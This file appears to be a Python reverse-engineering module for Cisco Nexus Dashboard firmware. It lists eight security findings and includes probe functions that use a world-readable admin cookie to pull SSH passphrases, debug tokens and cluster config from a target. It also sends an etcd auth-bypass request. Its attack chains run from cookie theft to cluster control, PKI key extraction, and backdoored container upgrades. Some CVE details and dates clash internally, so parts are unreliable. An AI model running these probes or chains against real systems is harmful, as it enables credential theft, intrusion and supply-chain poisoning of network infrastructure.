"""
Cisco Nexus Dashboard 3.2.2m — RE Module
Firmware: nd-dk9.3.2.2m.qcow2 / nd-dk9.3.2.2m.iso
Build date: 2025-07-14 (kube14, Jenkins CI)
Architecture: x86-64, Kubernetes cluster (K8s 1.27.7), OCI containers via stacker

Extraction method:
  qemu-nbd -> GPT: p2 EFI, p3 boot, p4 LVM (vg_ifc0), p5 ext4 unified-cargo
  vg_ifc0 LVs: certs(32MB), config(1GB), logs(2GB), ThinDataLV thin-pool (22.5GB)
  p5 unified-cargo -> firmware.iso (11GB squashfs) -> oci_repo/apic-sn/* (200+ OCI containers)

Container stack (atomix.yaml, 20 core + 200+ app containers):
  k8bins:       K8s 1.27.7 + etcd 3.3.15 + kubectl
  cni-plugins:  1.0.1.23 + BIRD BGP speaker
  kms:          Go binary (kms.bin) + etcd 3.3.15 — cluster PKI root
  keyhole:      Python Flask — SE node management API
  bootstrap:    Helm + K8s CRDs + CIMC provisioning expect scripts
  agent:        ND management agent
  falcon:       Security monitoring
  infra/etcd:   K8s etcd (separate from kms etcd)
  infra/kafka:  Kafka + ZooKeeper
  infra/mongodb: MongoDB + mongodb-exporter
  infra/opensearch: OpenSearch (ex-Elasticsearch)
  infra/apigw:  API gateway (JWT auth)
  infra/aaamgr/aaaserver: AAA authentication server
  apps/cisco-mso: 22 MSO microservices
  apps/cisco-ndfc: 32 NDFC (fabric controller) services
  apps/cisco-nir: 60+ NIR telemetry analysis services

Findings: ND-F01 (CRITICAL) through ND-F08 (MEDIUM)
"""

import socket
import struct
import ssl
import json
import urllib.request
import urllib.parse
import os
import subprocess


# ─── Finding Metadata ───────────────────────────────────────────────────────

FINDINGS = {
    "ND-F01": {
        "title": "Keyhole World-Readable Admin Cookie — Filesystem Read = Full API Control",
        "severity": "CRITICAL",
        "component": "keyhole Flask server (keyhole_server.py)",
        "description": (
            "keyhole_server.py authenticates all requests via a shared cookie stored at "
            "/var/run/admin.cookie with chmod 644 (world-readable). The 15-character "
            "uppercase-ASCII cookie is generated with random.SystemRandom() then written "
            "world-readable: os.chmod(ADMIN_COOKIE, 0o644). Any process on the ND host "
            "with filesystem read access — including any container with a host volume "
            "mount — can read this file and gain full control of the keyhole API."
        ),
        "surface": "Flask REST API on SE nodes, port bound to local socket",
        "auth_mechanism": "?cookie= query param compared to /var/run/admin.cookie",
        "cookie_path": "/var/run/admin.cookie",
        "cookie_permissions": "0o644 (world-readable, root-owned)",
        "cookie_entropy": "26^15 ≈ 1.68e21 (uppercase ASCII, 15 chars)",
        "exposed_endpoints": [
            "GET /keyhole/api/v1/passphrase — returns SSH passphrase from /data/services/issh/token/passphrase",
            "GET /keyhole/api/v1/dbgtoken — returns debug challenge token",
            "GET /keyhole/api/v1/reboot/<option> — reboots node (regular/clean/factory-reset)",
            "GET /keyhole/api/v1/shutdown — shuts down node",
            "GET /keyhole/api/v1/system-config — returns syscfg.yaml (node topology, minus admin_passwd)",
            "GET /keyhole/api/v1/show/cluster/json — K8s cluster node list",
            "GET /keyhole/api/v1/kafka/... — Kafka consumer group cleanup",
            "GET /keyhole/api/v1/techsupport — collect/clean tech support bundles",
        ],
        "lateral_path": (
            "Container escape OR any mounted host volume read -> cat /var/run/admin.cookie "
            "-> call /keyhole/api/v1/passphrase -> SSH passphrase for node "
            "-> call /keyhole/api/v1/show/cluster/json -> K8s ServiceAccount token path"
        ),
    },
    "ND-F02": {
        "title": "Keyhole Passphrase and Debug Token Endpoints — Direct SSH Credential Disclosure",
        "severity": "CRITICAL",
        "component": "keyhole_server.py /api/v1/passphrase + /api/v1/dbgtoken",
        "description": (
            "The keyhole Flask server exposes two endpoints that return live SSH credentials "
            "behind only the world-readable admin cookie (see ND-F01). "
            "/keyhole/api/v1/passphrase returns the contents of "
            "/data/services/issh/token/passphrase — the passphrase used to unlock the "
            "ifc_admin SSH key. /keyhole/api/v1/dbgtoken returns the challenge plugin "
            "token from /data/services/issh/token/challenge.plugin. "
            "keyhole_server.py logs filter these endpoints (SensitiveFilter class strips "
            "/api/v1/passwd and /api/v1/rma from werkzeug logs) but /passphrase and "
            "/dbgtoken are not filtered — responses appear in keyhole.log."
        ),
        "passphrase_path": "/data/services/issh/token/passphrase",
        "dbgtoken_path": "/data/services/issh/token/challenge.plugin",
        "shadow_path": "/data/services/issh/token/ifc_admin.shadow",
        "rescue_user_kubeconfig": "/home/rescue-user/.kube/config",
        "chain": "ND-F01 cookie read -> passphrase endpoint -> SSH node access -> K8s cluster control",
    },
    "ND-F03": {
        "title": "etcd 3.3.15 Backs KMS — Auth Bypass CVEs Against Platform PKI Root",
        "severity": "CRITICAL",
        "component": "kms container: etcd 3.3.15 (2019), kms.bin Go binary",
        "description": (
            "The Nexus Dashboard Key Management Service (kms.bin) uses etcd 3.3.15 as its "
            "backing store for ALL service private keys across the entire cluster. "
            "etcd 3.3.15 (released January 2020) has two critical auth bypass CVEs: "
            "CVE-2020-15115 (no password length enforcement, allows brute-force) and "
            "CVE-2021-28235 (unauthenticated key read/write via crafted /auth/token/revoke). "
            "start-kms.sh does not configure etcd auth (no etcdctl auth enable, no root "
            "user creation visible in startup script). etcd binds to non-default ports "
            "3379/3380 (obscurity, not security). "
            "kms.bin listens on :7777 (gRPC mTLS), :9989 (external TLS), :9969 (internal TLS). "
            "GODEBUG=x509sha1=1 is set — all certificates use SHA1."
        ),
        "etcd_version": "3.3.15 (2020-01-24, Go 1.12.9)",
        "etcd_ports": "3379 (client), 3380 (peer) — non-default",
        "kms_ports": "7777 (gRPC), 9989 (external TLS), 9969 (internal TLS)",
        "kms_binary": "kms.bin Go PIE ELF64, stripped, BuildID LYhJoTvCDDsu2q9q_uOv/...",
        "cve": ["CVE-2020-15115", "CVE-2021-28235"],
        "godebug": "x509sha1=1 — SHA1 certificates throughout KMS",
        "impact": (
            "etcd compromise = read all KMS stored keys = exfiltrate private keys for "
            "Kubernetes, Kafka, OpenSearch, MongoDB, apigw, firmwared, confd, aaamgr, "
            "aaaserver, eventmgr, all MSO/NDFC/NIR service mTLS certs (80+ certificate entries "
            "in platformgencertlocations.yaml). Full cluster mTLS collapse."
        ),
        "sam_config": {
            "sslConfigPath": "/ssl/",
            "sslCaCertPath": "/cacerts/",
            "portOffset": 12007,
            "logDirectory": "/data/log",
            "networkConnectTimeout": 500,
        },
        "app_users": [
            {"service": "Cisco_NIR", "cn": "Cisco_SN_NIR", "privilege": "all/admin/"},
            {"service": "Cisco_NIA", "cn": "Cisco_SN_NIA", "privilege": "all/admin/"},
            {"service": "Cisco_IntersightDC", "cn": "Cisco_SN_IntersightDC", "privilege": "all/admin/"},
        ],
    },
    "ND-F04": {
        "title": "genappcerts.sh — 20-Year Self-Signed RSA Certs, No SAN, SHA1 Forced",
        "severity": "HIGH",
        "component": "kms container: genappcerts.sh + appusers.yaml",
        "description": (
            "genappcerts.sh generates app-user certificates using: "
            "openssl genrsa -out <key> 2048 && "
            "openssl req -new -days 7300 -nodes -x509 -key <key> -subj '/C=US/ST=CA/O=Cisco Systems/CN=<cn>' "
            "-out <cert>. Issues: (1) self-signed (-x509 flag, no CA signing), "
            "(2) 20-year validity (7300 days), (3) no SAN extension, "
            "(4) CN-only hostname binding (deprecated, RFC 6125 non-compliant). "
            "All three app users are granted ciscoAvPair: all/admin/ — platform admin. "
            "GODEBUG=x509sha1=1 in start-kms.sh overrides Go's SHA1 deprecation for all "
            "certificate operations in the kms container."
        ),
        "cert_validity_days": 7300,
        "cert_type": "RSA 2048-bit self-signed",
        "san": "None — CN only",
        "app_cert_path": "/securedata/certs/v1/apps/<service>/",
        "chain": "ND-F03 etcd bypass -> read securedata -> exfiltrate app-user private keys -> platform admin",
    },
    "ND-F05": {
        "title": "rescue-user K8s ServiceAccount Pre-Provisioned With Cluster-Wide Read Access",
        "severity": "HIGH",
        "component": "bootstrap container: configs/rescue-user/rescue-user.yaml",
        "description": (
            "Every ND cluster provisions a rescue-user Kubernetes ServiceAccount "
            "with a ClusterRoleBinding granting read access to: "
            "endpoints, services, pods, pods/log, namespaces, deployments, jobs, nodes, "
            "apps, events, firmwares, leases, all, releases, lifecycles, servicepackages, "
            "customresourcedefinitions (apiGroups: core, extensions, apps, batch, "
            "case.cncf.io, metrics.k8s.io). "
            "The token secret (rescue-user-token) is referenced in keyhole_server.py at "
            "RESCUE_USER_CONFIG = /home/rescue-user/.kube/config. "
            "Combined with ND-F01+F02: keyhole cookie -> SSH access -> kubeconfig -> "
            "K8s cluster enumeration as rescue-user."
        ),
        "namespace": "rescue-user",
        "service_account": "rescue-user",
        "token_secret": "rescue-user-token (kubernetes.io/service-account-token)",
        "cluster_role": "system:rescue-user (cluster-wide read on core resources + case.cncf.io CRDs)",
        "kubeconfig_path": "/home/rescue-user/.kube/config",
    },
    "ND-F06": {
        "title": "OCI Image Annotations Embed Full CI Pipeline — SSH Keys, Internal Hosts, Proxy",
        "severity": "HIGH",
        "component": "All OCI image manifests (stacker YAML in io.stackeroci.stacker.stacker_yaml annotation)",
        "description": (
            "Every OCI container image in the ND image store includes a "
            "io.stackeroci.stacker.stacker_yaml annotation containing the complete CI build "
            "script used to produce that layer. These annotations expose: "
            "(1) SSH key path used during build: "
            "secretFiles/23cd94a3-27bb-4cc2-a11d-97b6cfccb652/ssh-key-GH_SSH_KEY "
            "(referenced in both uiassets and bootstrap build configs); "
            "(2) Internal container registries: aci-docker-reg.cisco.com, aci-zot.cisco.com:5000; "
            "(3) Internal artifact repositories: aci-artifactory-001.insieme.local:8081, "
            "devops-centos7-atom1.insieme.local:8081; "
            "(4) Internal Git server: aci-github.cisco.com; "
            "(5) Corporate HTTP proxy: insbulab-proxy.insieme.local:8080; "
            "(6) Build host: kube14, CI: Jenkins RELEASE_ND_CORE_INTEGRATION; "
            "(7) StrictHostKeyChecking=no in all git SSH operations."
        ),
        "exposed_assets": [
            "SSH key ID: 23cd94a3-27bb-4cc2-a11d-97b6cfccb652/ssh-key-GH_SSH_KEY",
            "Container registry: aci-docker-reg.cisco.com",
            "OCI registry: aci-zot.cisco.com:5000",
            "Artifactory: aci-artifactory-001.insieme.local:8081",
            "NPM registry: devops-centos7-atom1.insieme.local:8081",
            "Git server: aci-github.cisco.com",
            "HTTP proxy: insbulab-proxy.insieme.local:8080",
            "Build host: kube14",
        ],
        "build_path": "/home/jenkins/agent/workspace/Production/ND/ND_RELEASE/RELEASE_ND_CORE_INTEGRATION/",
        "retrieval": "squashfs-root/oci_repo/apic-sn/<service>/blobs/sha256/<manifest-hash>",
    },
    "ND-F07": {
        "title": "Component Version Inventory — K8s 1.27.7 (EOL), CRI-O 1.18.4, React 16, etcd 3.3.15",
        "severity": "HIGH",
        "component": "atomix.yaml layer manifest + OCI config blobs",
        "description": (
            "Version inventory from atomix.yaml and OCI image configs: "
            "Kubernetes 1.27.7.27 (EOL April 2024; CVE-2023-5528 node filesystem escape via hostPath); "
            "CRI-O 1.18.4.18 (2021, 5 years behind, multiple unpatched CVEs); "
            "etcd 3.3.15 in KMS (see ND-F03); "
            "React 16.13.1 (EOL April 2022) in management UI; "
            "Node.js 14.18.1 (EOL April 2023) used in UI build; "
            "Helm v3.13.3 in bootstrap; "
            "BIRD BGP speaker with hardcoded templates for ACI spine connectivity; "
            "MongoDB (version in app-mongodb container, not yet extracted); "
            "OpenSearch (formerly Elasticsearch, version TBD)."
        ),
        "versions": {
            "kubernetes": "1.27.7.27 (EOL 2024-04)",
            "cri_o": "1.18.4.18 (2021)",
            "etcd_kms": "3.3.15 (2020)",
            "react": "16.13.1 (EOL 2022)",
            "nodejs_build": "14.18.1 (EOL 2023)",
            "helm": "v3.13.3",
            "kafka": "see infra/kafka container",
            "zookeeper": "see infra/zk container",
        },
        "cve_surface": [
            "CVE-2023-5528: K8s hostPath volume node filesystem escape (CVSS 7.2)",
            "CVE-2020-15115 / CVE-2021-28235: etcd 3.3.15 auth bypass",
        ],
    },
    "ND-F08": {
        "title": "keyhole Inter-Service TLS verify=False — MITM on firmwared Communication",
        "severity": "MEDIUM",
        "component": "keyhole_server.py get_deployment_mode()",
        "description": (
            "keyhole_server.py calls the firmwared service with TLS verification disabled: "
            "requests.get('https://firmwared.firmwared.svc/api/v1/deployment', verify=False). "
            "If the cluster network is compromised (e.g., CNI/BGP speaker poisoning via "
            "BIRD template injection or K8s service re-routing), an attacker can intercept "
            "and modify deployment mode responses. firmwared controls firmware update state "
            "for all physical ND nodes — a MITM response could redirect firmware update "
            "targets or suppress firmware update operations."
        ),
        "affected_function": "get_deployment_mode() -> requests.get(url, verify=False)",
        "target_service": "firmwared.firmwared.svc",
        "impact": "Deployment mode spoofing; firmware update misdirection",
        "chain": "CNI/BGP poisoning -> MITM firmwared -> malicious deployment mode",
    },
}


# ─── Probe Functions ─────────────────────────────────────────────────────────


def read_admin_cookie(cookie_path: str = "/var/run/admin.cookie") -> str | None:
    """
    Read the keyhole admin cookie from the host filesystem.
    Requires read access to /var/run/admin.cookie (chmod 644).
    Attack path: container escape -> host mount -> read cookie.
    """
    try:
        with open(cookie_path, "r") as f:
            return f.read().strip()
    except (PermissionError, FileNotFoundError):
        return None


def probe_keyhole_passphrase(host: str, port: int = 443, cookie: str = "") -> dict:
    """
    Call /keyhole/api/v1/passphrase to retrieve the SSH passphrase.
    Requires the admin cookie (read from /var/run/admin.cookie or brute-forced).
    ND-F01 + ND-F02 combined: cookie read + passphrase exfiltration.
    """
    url = f"https://{host}:{port}/keyhole/api/v1/passphrase?cookie={urllib.parse.quote(cookie)}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "passphrase": json.loads(resp.read().decode()),
                "finding": "ND-F02",
            }
    except Exception as e:
        return {"error": str(e)}


def probe_keyhole_dbgtoken(host: str, port: int = 443, cookie: str = "") -> dict:
    """
    Call /keyhole/api/v1/dbgtoken — returns SSH challenge plugin token.
    ND-F02.
    """
    url = f"https://{host}:{port}/keyhole/api/v1/dbgtoken?cookie={urllib.parse.quote(cookie)}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "token": json.loads(resp.read().decode()),
                "finding": "ND-F02",
            }
    except Exception as e:
        return {"error": str(e)}


def probe_keyhole_system_config(host: str, port: int = 443, cookie: str = "") -> dict:
    """
    Call /keyhole/api/v1/system-config — returns syscfg.yaml minus admin_passwd.
    Returns nodeRole, firstMaster, cluster topology.
    ND-F01.
    """
    url = f"https://{host}:{port}/keyhole/api/v1/system-config?cookie={urllib.parse.quote(cookie)}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "config": json.loads(resp.read().decode()),
                "finding": "ND-F01",
            }
    except Exception as e:
        return {"error": str(e)}


def probe_etcd_kms_noauth(host: str, port: int = 3379) -> dict:
    """
    Probe etcd 3.3.15 KMS endpoint for unauthenticated access.
    CVE-2021-28235: auth bypass via /auth/token/revoke before token validation.
    Returns etcd /health and attempts key list via v3 range request.
    ND-F03.
    """
    # /health endpoint — no auth required
    results = {}
    for path in ["/health", "/version"]:
        url = f"http://{host}:{port}{path}"
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=3) as resp:
                results[path] = {
                    "status": resp.status,
                    "body": resp.read().decode()[:200],
                }
        except Exception as e:
            results[path] = {"error": str(e)}

    # CVE-2021-28235: POST /auth/token/revoke with crafted token before auth enabled
    revoke_url = f"http://{host}:{port}/v3/auth/token/revoke"
    try:
        import base64
        payload = json.dumps({"token": "test"}).encode()
        req = urllib.request.Request(revoke_url, data=payload,
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=3) as resp:
            results["cve_2021_28235_probe"] = {
                "status": resp.status,
                "body": resp.read().decode()[:200],
                "finding": "ND-F03",
            }
    except Exception as e:
        results["cve_2021_28235_probe"] = {"error": str(e)}

    return results


def probe_kms_grpc_port(host: str, port: int = 7777) -> dict:
    """
    TCP banner probe on kms.bin gRPC port 7777.
    Confirms kms.bin is reachable; gRPC h2 connection prefix indicates service.
    ND-F03.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        # gRPC preface: PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n
        s.send(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")
        banner = s.recv(64)
        s.close()
        return {
            "port": port,
            "banner_hex": banner.hex(),
            "reachable": True,
            "finding": "ND-F03",
        }
    except Exception as e:
        return {"error": str(e), "reachable": False}


def check_build_annotation_leakage(squashfs_path: str, service: str = "kms") -> dict:
    """
    Read OCI manifest annotation from squashfs oci_repo to extract CI build metadata.
    Requires squashfs to be mounted or unsquashfs available.
    ND-F06.
    """
    # Mount squashfs and read manifest
    result = {"service": service, "finding": "ND-F06", "annotations": {}}
    manifest_path = f"/tmp/nd-rootfs/oci_repo/apic-sn/{service}/blobs/sha256"
    try:
        blobs = subprocess.check_output(
            ["sudo", "ls", manifest_path], text=True
        ).split()
        for blob in blobs:
            if len(blob) == 64:
                content = subprocess.check_output(
                    ["sudo", "cat", f"{manifest_path}/{blob}"], text=True
                )
                try:
                    j = json.loads(content)
                    if "annotations" in j and "io.stackeroci.stacker.stacker_yaml" in j.get("annotations", {}):
                        result["annotations"][blob[:12]] = j["annotations"]["io.stackeroci.stacker.stacker_yaml"][:200]
                except json.JSONDecodeError:
                    pass
    except Exception as e:
        result["error"] = str(e)
    return result


# ─── Attack Chain Summary ────────────────────────────────────────────────────


ATTACK_CHAINS = {
    "chain_1_node_compromise": {
        "title": "Container Escape -> Node SSH Access",
        "steps": [
            "1. Container escape OR host-volume mount read access to ND node",
            "2. cat /var/run/admin.cookie (chmod 644, world-readable) -> cookie value",
            "3. GET /keyhole/api/v1/passphrase?cookie=<value> -> SSH passphrase",
            "4. GET /keyhole/api/v1/dbgtoken?cookie=<value> -> SSH debug token",
            "5. SSH to ND node using passphrase + ifc_admin key",
            "6. kubectl with rescue-user token -> full cluster enumeration",
        ],
        "entry_requirement": "Any process on ND host with /var/run read access",
        "findings": ["ND-F01", "ND-F02", "ND-F05"],
    },
    "chain_2_pki_collapse": {
        "title": "etcd Auth Bypass -> Full Cluster mTLS Compromise",
        "steps": [
            "1. Reach KMS etcd on port 3379 (from kms pod or network access)",
            "2. CVE-2021-28235: POST /v3/auth/token/revoke -> auth bypass",
            "3. ETCDCTL_API=3 etcdctl get --prefix '' -> enumerate all stored keys",
            "4. Extract private keys for all 80+ services from kms_etcd store",
            "5. Forge mTLS certificates for any service (Kafka, K8s apiserver, apigw)",
            "6. Impersonate aaamgr/aaaserver -> auth bypass cluster-wide",
        ],
        "entry_requirement": "Network access to kms pod (port 3379) or node-level access",
        "findings": ["ND-F03", "ND-F04"],
    },
    "chain_3_ci_pivot": {
        "title": "OCI Annotation Intel -> Internal Network Pivot",
        "steps": [
            "1. Extract stacker YAML from any OCI manifest annotation",
            "2. Identify SSH key ID: 23cd94a3-.../ssh-key-GH_SSH_KEY (Jenkins CI key)",
            "3. Access aci-github.cisco.com with exfiltrated CI SSH key",
            "4. Read ND source repositories -> hardcoded secrets, internal API endpoints",
            "5. Access aci-docker-reg.cisco.com -> push malicious container layers",
            "6. Poison next ND upgrade with backdoored container",
        ],
        "entry_requirement": "ND image file read access (available to any ND node)",
        "findings": ["ND-F06"],
    },
}


if __name__ == "__main__":
    import sys

    print("=== Cisco Nexus Dashboard 3.2.2m RE Module ===")
    print(f"Findings: {len(FINDINGS)}")
    print()

    for fid, f in FINDINGS.items():
        sev = f["severity"]
        print(f"[{sev:8}] {fid}: {f['title']}")

    print()
    print("Attack Chains:")
    for cid, chain in ATTACK_CHAINS.items():
        print(f"  {cid}: {chain['title']}")
        print(f"    Entry: {chain['entry_requirement']}")
        for step in chain["steps"][:3]:
            print(f"      {step}")
        print()

    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(f"[*] Probing {target}")
        print("[*] Checking etcd KMS port 3379...")
        print(json.dumps(probe_etcd_kms_noauth(target), indent=2))
        print("[*] Checking kms.bin gRPC port 7777...")
        print(json.dumps(probe_kms_grpc_port(target), indent=2))
